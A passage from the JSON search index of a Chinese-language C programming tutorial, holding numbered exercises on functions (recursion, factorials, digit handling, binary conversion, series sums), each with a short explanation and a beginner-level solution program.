&lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint age(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u4eba\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u5e74\u9f84\n    int result = age(n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u9012\u5f52\u8ba1\u7b97\u5e74\u9f84\u7684\u51fd\u6570\nint age(int n) {\n    if (n == 1) {\n        return 10; // \u7b2c1\u4e2a\u4eba\u7684\u5e74\u9f84\u662f10\u5c81\n    }\n    else {\n        // \u9012\u5f52\u8ba1\u7b97\u5e74\u9f84\n        return age(n - 1) + 2;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#23","title":"23","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fact</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u9012\u5f52\u6cd5\u8ba1\u7b97\u9636\u4e58\u3002<code>factSum</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u5faa\u73af\u8c03\u7528 <code>fact</code> \u51fd\u6570\u8ba1\u7b971\u5230n\u7684\u9636\u4e58\uff0c\u5e76\u5c06\u7ed3\u679c\u7d2f\u52a0\u5230 <code>sum</code> \u53d8\u91cf\u4e2d\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>factSum</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint fact(int n);\nint factSum(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u9636\u4e58\u548c\n    int result = factSum(n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"fact: %d\", fact(n));\n    printf(\"factSum: %d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u9636\u4e58\u7684\u51fd\u6570\nint fact(int n) {\n    if (n == 0 || n == 1) {\n        return 1;\n    }\n    else {\n        return n * fact(n - 1);\n    }\n}\n\n// \u8ba1\u7b97\u9636\u4e58\u548c\u7684\u51fd\u6570\nint factSum(int n) {\n    int sum = 0;\n\n    for (int i = 1; i &lt;= n; i++) {\n        // \u8c03\u7528 fact \u51fd\u6570\u8ba1\u7b97\u9636\u4e58\uff0c\u5e76\u7d2f\u52a0\u5230 sum\n        sum += fact(i);\n    }\n\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#24","title":"24","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fact</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u9012\u5f52\u6cd5\u8ba1\u7b97\u9636\u4e58\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>fact</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a3\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u9636\u4e58\u7ed3\u679c: 6\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint fact(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u9636\u4e58\n    int result = fact(n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u9636\u4e58\u7684\u51fd\u6570\nint fact(int n) {\n    if (n == 0 || n == 1) {\n        return 1;\n    }\n    else {\n        return n * fact(n - 1);\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#25","title":"25","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>findMax</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u6574\u6570 <code>n1</code> \u548c <code>n2</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u6761\u4ef6\u8fd0\u7b97\u7b26 <code>? :</code> \u6765\u6bd4\u8f83\u5b83\u4eec\u7684\u5927\u5c0f\uff0c\u8fd4\u56de\u6700\u5927\u503c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>findMax</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a5\u548c8\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u6700\u5927\u503c: 8\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint findMax(int n1, int n2);\n\nint main() {\n    int n1, n2;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n    scanf(\"%d %d\", &amp;n1, &amp;n2);\n\n    // \u8c03\u7528\u51fd\u6570\u627e\u5230\u6700\u5927\u503c\n    int result = findMax(n1, n2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"\u6700\u5927\u503c: %d\\n\", result);\n\n    return 0;\n}\n\n// \u627e\u5230\u4e24\u4e2a\u6574\u6570\u7684\u6700\u5927\u503c\u7684\u51fd\u6570\nint findMax(int n1, int n2) {\n    return (n1 &gt; n2) ? n1 : n2;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#26","title":"26","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>print_digitals</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u9012\u5f52\u6cd5\u8f93\u51fa\u6bcf\u4e00\u4f4d\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>print_digitals</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u6309\u7167\u4ece\u9ad8\u5230\u4f4e\u7684\u987a\u5e8f\u8f93\u51fa\u6bcf\u4e00\u4f4d</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid print_digitals(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8f93\u51fa\u6bcf\u4e00\u4f4d\n    print_digitals(n);\n\n    return 0;\n}\n\n// \u8f93\u51fa\u6574\u6570\u6bcf\u4e00\u4f4d\u7684\u51fd\u6570\nvoid print_digitals(int n) {\n    if (n == 0) {\n        // \u5982\u679c n \u4e3a 0\uff0c\u76f4\u63a5\u8f93\u51fa 0\n        printf(\"0\\n\");\n    }\n    else {\n        // \u9012\u5f52\u8c03\u7528 print_digitals \u51fd\u6570\u8f93\u51fa\u6bcf\u4e00\u4f4d\n        print_digitals(n / 10);\n        // \u8f93\u51fa\u5f53\u524d\u4f4d\n        printf(\"%d\\n\", n % 10);\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#27","title":"27","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>dectobin</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u9012\u5f52\u6cd5\u5c06\u5176\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>dectobin</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a10\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u4e8c\u8fdb\u5236\u8868\u793a: 1010\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid dectibin(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u5c06\u5341\u8fdb\u5236\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\n    dectibin(n);\n\n    return 0;\n}\n\n// \u5c06\u5341\u8fdb\u5236\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u7684\u51fd\u6570\nvoid dectibin(int n) {\n    if (n &gt; 0) {\n        // \u9012\u5f52\u8c03\u7528 dectobin \u51fd\u6570\n        dectibin(n / 2);\n        // \u8f93\u51fa\u5f53\u524d\u4f4d\u7684\u4e8c\u8fdb\u5236\u503c\n        printf(\"%d\", n % 2);\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#28","title":"28","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>printdigits</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u5faa\u73af\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u9010\u4e2a\u8f93\u51fa\u6bcf\u4e00\u4f4d\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>printdigits</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid printdigits(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8f93\u51fa\u6bcf\u4e00\u4f4d\n    printdigits(n);\n\n    return 0;\n}\n\n// \u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u8f93\u51fa\u6bcf\u4e00\u4f4d\u7684\u51fd\u6570\nvoid printdigits(int n) {\n    while (n &gt; 0) {\n        // \u8f93\u51fa\u5f53\u524d\u4f4d\n        printf(\"%d\\n\", n % 10);\n        // \u79fb\u9664\u5f53\u524d\u4f4d\n        n /= 10;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#29","title":"29","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>calc_pow</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u6574\u6570 <code>x</code> \u548c <code>y</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u5faa\u73af\u7d2f\u4e58\u8ba1\u7b97\u7ec6\u83cc\u5206\u88c2\u540e\u7684\u4e2a\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u5e95\u6570\u548c\u6b21\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>calc_pow</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a\u5e95\u65702\u548c\u5206\u88c2\u6b21\u65703\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u5206\u88c2 3 \u6b21\u53ef\u4ee5\u5f97\u5230 8 \u4e2a\u7ec6\u83cc\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nlong long calc_pow(int x, int y);\n\nint main() {\n    int x, y;\n\n    // \u8f93\u5165\u5e95\u6570\u548c\u6b21\u6570\n    scanf(\"%d %d\", &amp;x, &amp;y);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7ec6\u83cc\u4e2a\u6570\n    long long result = calc_pow(x, y);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%lld\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u7ec6\u83cc\u5206\u88c2\u540e\u4e2a\u6570\u7684\u51fd\u6570\nlong long calc_pow(int x, int y) {\n    long long result = 1;\n\n    for (int i = 0; i &lt; y; i++) {\n        // \u4f7f\u7528\u5faa\u73af\u7d2f\u4e58\u8ba1\u7b97\u7ec6\u83cc\u4e2a\u6570\n        result *= x;\n    }\n\n    return result;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#30","title":"30","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>compute</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u957f\u5ea6\u4e3a10\u7684\u6574\u578b\u6570\u7ec4 <code>array</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u904d\u5386\u6570\u7ec4\u627e\u5230\u6700\u5927\u7684\u5076\u6570\u548c\u6700\u5c0f\u7684\u5947\u6570\uff0c\u5e76\u8ba1\u7b97\u5b83\u4eec\u7684\u5dee\u503c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6570\u7ec4\u5143\u7d20\uff0c\u7136\u540e\u8c03\u7528 <code>compute</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u6570\u7ec4\u4e3a{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u6700\u5927\u7684\u5076\u6570\u548c\u6700\u5c0f\u7684\u5947\u6570\u7684\u5dee\u503c\u4e3a: 9\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint compute(int array[10]);\n\nint main() {\n    int array[10];\n\n    // \u8f93\u5165\u6570\u7ec4\u5143\u7d20\n    for (int i = 0; i &lt; 10; i++) {\n        scanf(\"%d\", &amp;array[i]);\n    }\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u5dee\u503c\n    int result = compute(array);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u6570\u7ec4\u4e2d\u6700\u5927\u7684\u5076\u6570\u548c\u6700\u5c0f\u7684\u5947\u6570\u7684\u5dee\u7684\u51fd\u6570\nint compute(int array[10]) {\n    int max_even = -1;  // \u521d\u59cb\u5316\u6700\u5927\u7684\u5076\u6570\u4e3a -1\n    int min_odd = -1;   // \u521d\u59cb\u5316\u6700\u5c0f\u7684\u5947\u6570\u4e3a -1\n\n    for (int i = 0; i &lt; 10; i++) {\n        if (array[i] % 2 == 0) {\n            // \u5982\u679c\u5f53\u524d\u5143\u7d20\u4e3a\u5076\u6570\uff0c\u66f4\u65b0\u6700\u5927\u7684\u5076\u6570\n            if (max_even == -1 || array[i] &gt; max_even) {\n                max_even = array[i];\n            }\n        }\n        else {\n            // \u5982\u679c\u5f53\u524d\u5143\u7d20\u4e3a\u5947\u6570\uff0c\u66f4\u65b0\u6700\u5c0f\u7684\u5947\u6570\n            if (min_odd == -1 || array[i] &lt; min_odd) {\n                min_odd = array[i];\n            }\n        }\n    }\n\n    // \u8ba1\u7b97\u5dee\u503c\n    return max_even - min_odd;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#31","title":"31","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>ari_sum</code> \u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570 <code>start</code>\u3001<code>delta</code> \u548c <code>n</code>\uff0c\u4f7f\u7528\u7b49\u5dee\u6570\u5217\u6c42\u548c\u516c\u5f0f\u8ba1\u7b97\u7b49\u5dee\u6570\u5217\u524dn\u9879\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u7b49\u5dee\u6570\u5217\u7684\u9996\u9879\u3001\u516c\u5dee\u548c\u524dn\u9879\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>ari_sum</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u9996\u98790.1\u3001\u516c\u5dee0.2\u548c\u524dn\u9879\u65703\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u7b49\u5dee\u6570\u5217\u524d3\u9879\u7684\u548c\u4e3a: 0.900000\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\ndouble ari_sum(double start, double delta, int n);\n\nint main() {\n    double start, delta;\n    int n;\n\n    // \u8f93\u5165\u7b49\u5dee\u6570\u5217\u7684\u9996\u9879\u3001\u516c\u5dee\u548c\u524dn\u9879\u6570\n    scanf(\"%lf %lf %d\", &amp;start, &amp;delta, &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7b49\u5dee\u6570\u5217\u524dn\u9879\u548c\n    double result = ari_sum(start, delta, n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%.6lf\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u7b49\u5dee\u6570\u5217\u524dn\u9879\u548c\u7684\u51fd\u6570\ndouble ari_sum(double start, double delta, int n) {\n    // \u4f7f\u7528\u7b49\u5dee\u6570\u5217\u6c42\u548c\u516c\u5f0f\u8ba1\u7b97\u548c\n    return n * (2 * start + (n - 1) * delta) / 2;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#32","title":"32","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>sum_cubic</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u591a\u4f4d\u6574\u6570 <code>a</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u7528\u5faa\u73af\u904d\u5386\u5404\u4f4d\u6570\u5b57\uff0c\u8ba1\u7b97\u5b83\u4eec\u7684\u7acb\u65b9\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u591a\u4f4d\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>sum_cubic</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u6574\u657012345\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"sum: 225\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint sum_cubic(int a);\n\nint main() {\n    int a;\n\n    // \u8f93\u5165\u4e00\u4e2a\u591a\u4f4d\u6574\u6570\n    scanf(\"%d\", &amp;a);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u5404\u4f4d\u6570\u5b57\u7684\u7acb\u65b9\u548c\n    int result = sum_cubic(a);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u5404\u4f4d\u6570\u5b57\u7684\u7acb\u65b9\u548c\u7684\u51fd\u6570\nint sum_cubic(int a) {\n    int sum = 0;\n\n    // \u5faa\u73af\u904d\u5386\u5404\u4f4d\u6570\u5b57\uff0c\u8ba1\u7b97\u7acb\u65b9\u548c\n    while (a &gt; 0) {\n        int digit = a % 10;  // \u83b7\u53d6\u4e2a\u4f4d\u6570\u5b57\n        sum += digit * digit * digit;  // \u7acb\u65b9\u548c\u7d2f\u52a0\n        a /= 10;  // \u53bb\u6389\u4e2a\u4f4d\u6570\u5b57\n    }\n\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#33","title":"33","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>is_number</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>number</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u5148\u5224\u65ad\u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\uff0c\u7136\u540e\u4f7f\u7528\u6570\u7ec4\u8bb0\u5f55\u5404\u4e2a\u6570\u5b57\u7684\u51fa\u73b0\u6b21\u6570\uff0c\u6700\u540e\u5224\u65ad\u662f\u5426\u81f3\u5c11\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>is_number</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u6574\u6570144\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u6ee1\u8db3\u6761\u4ef6\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint is_number(int number);\n\nint main() {\n    int number;\n\n    // \u8f93\u5165\u4e00\u4e2a\u6574\u6570\n    scanf(\"%d\", &amp;number);\n\n    // \u8c03\u7528\u51fd\u6570\u5224\u65ad\u662f\u5426\u6ee1\u8db3\u6761\u4ef6\n    int result = is_number(number);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    if (result) {\n        printf(\"\u6ee1\u8db3\u6761\u4ef6\\n\");\n    }\n    else {\n        printf(\"\u4e0d\u6ee1\u8db3\u6761\u4ef6\\n\");\n    }\n\n    return 0;\n}\n\n// \u5224\u65ad\u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\u4e14\u81f3\u5c11\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\u7684\u51fd\u6570\nint is_number(int number) {\n    // \u5224\u65ad\u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\n    int root = sqrt(number);\n    if (root * root != number) {\n        return 0;  // \u4e0d\u662f\u5b8c\u5168\u5e73\u65b9\u6570\uff0c\u8fd4\u56de0\n    }\n\n    // \u5224\u65ad\u662f\u5426\u81f3\u5c11\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\n    int digits[10] = { 0 };  // \u4f7f\u7528\u6570\u7ec4\u8bb0\u5f55\u5404\u4e2a\u6570\u5b57\u7684\u51fa\u73b0\u6b21\u6570\n    while (number &gt; 0) {\n        int digit = number % 10;\n        digits[digit]++;\n        if (digits[digit] == 2) {\n            return 1;  // \u81f3\u5c11\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\uff0c\u8fd4\u56de1\n        }\n        number /= 10;\n    }\n\n    return 0;  // \u6ca1\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\uff0c\u8fd4\u56de0\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#34","title":"34","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>count_digit</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>N</code> \u548c\u4e00\u4e2a\u6307\u5b9a\u7684\u6570\u5b57 <code>D</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u7edf\u8ba1 <code>N</code> \u4e2d <code>D</code> \u7684\u51fa\u73b0\u6b21\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\u548c\u4e00\u4e2a\u6307\u5b9a\u7684\u6570\u5b57\uff0c\u7136\u540e\u8c03\u7528 <code>count_digit</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u6574\u6570-21252\u548c\u6307\u5b9a\u6570\u5b572\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u6570\u5b57 2 \u5728\u6574\u6570 -21252 \u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u4e3a: 3\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint count_digit(int N, int D);\n\nint main() {\n    int N, D;\n\n    // \u8f93\u5165\u6574\u6570\u548c\u6307\u5b9a\u7684\u6570\u5b57\n    //\u8bf7\u8f93\u5165\u4e00\u4e2a\u6574\u6570 N\n    scanf(\"%d\", &amp;N);\n    //\u8bf7\u8f93\u5165\u4e00\u4e2a\u8303\u56f4\u5728 [0, 9] \u4e4b\u95f4\u7684\u4e2a\u4f4d\u6570 D\n    scanf(\"%d\", &amp;D);\n\n    // \u8c03\u7528\u51fd\u6570\u7edf\u8ba1\u6307\u5b9a\u6570\u5b57\u7684\u51fa\u73b0\u6b21\u6570\n    int result = count_digit(N, D);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u7edf\u8ba1\u6574\u6570\u4e2d\u6307\u5b9a\u6570\u5b57\u51fa\u73b0\u6b21\u6570\u7684\u51fd\u6570\nint count_digit(int N, int D) {\n    int count = 0;\n\n    // \u5904\u7406\u8d1f\u6570\u7684\u60c5\u51b5\n    if (N &lt; 0) {\n        N = -N;\n    }\n\n    // \u904d\u5386\u6574\u6570\u7684\u6bcf\u4e00\u4f4d\uff0c\u7edf\u8ba1\u6307\u5b9a\u6570\u5b57\u7684\u51fa\u73b0\u6b21\u6570\n    while (N &gt; 0) {\n        int digit = N % 10;\n        if (digit == D) {\n            count++;\n        }\n        N /= 10;\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#35","title":"35","text":"<p>\u4ee5\u4e0aC\u8bed\u8a00\u4ee3\u7801\u5b9e\u73b0\u4e86\u4e00\u4e2a\u51fd\u6570 <code>hollow_pyramid</code>\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570 <code>n</code>\uff0c\u8868\u793a\u91d1\u5b57\u5854\u7684\u5c42\u6570\uff0c\u7136\u540e\u8f93\u51fa\u76f8\u5e94\u5c42\u6570\u7684\u7a7a\u5fc3\u6570\u5b57\u91d1\u5b57\u5854\u3002\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <ol> <li>\u4f7f\u7528\u4e24\u4e2a\u5d4c\u5957\u7684\u5faa\u73af\u6765\u63a7\u5236\u91d1\u5b57\u5854\u7684\u5c42\u6570\u548c\u6bcf\u884c\u7684\u8f93\u51fa\u3002</li> <li>\u7b2c\u4e00\u4e2a\u5faa\u73af\u63a7\u5236\u91d1\u5b57\u5854\u7684\u5c42\u6570\uff0c\u5185\u90e8\u5faa\u73af\u7528\u4e8e\u8f93\u51fa\u6bcf\u884c\u7684\u7a7a\u683c\u548c\u6570\u5b57\u3002</li> <li>\u5728\u6bcf\u884c\u8f93\u51fa\u524d\u5148\u6253\u5370\u4e00\u5b9a\u6570\u91cf\u7684\u7a7a\u683c\uff0c\u4f7f\u5f97\u6570\u5b57\u5c45\u4e2d\u5bf9\u9f50\u3002</li> <li>\u8f93\u51fa\u5de6\u4fa7\u7684\u6570\u5b57\u3002</li> <li>\u5982\u679c\u5f53\u524d\u5c42\u4e0d\u662f\u7b2c\u4e00\u5c42\uff0c\u5c31\u8f93\u51fa\u4e2d\u95f4\u7684\u7a7a\u683c\u6216\u91cd\u590d\u7684\u6570\u5b57\uff0c\u4ee5\u5f62\u6210\u7a7a\u5fc3\u6548\u679c\u3002</li> 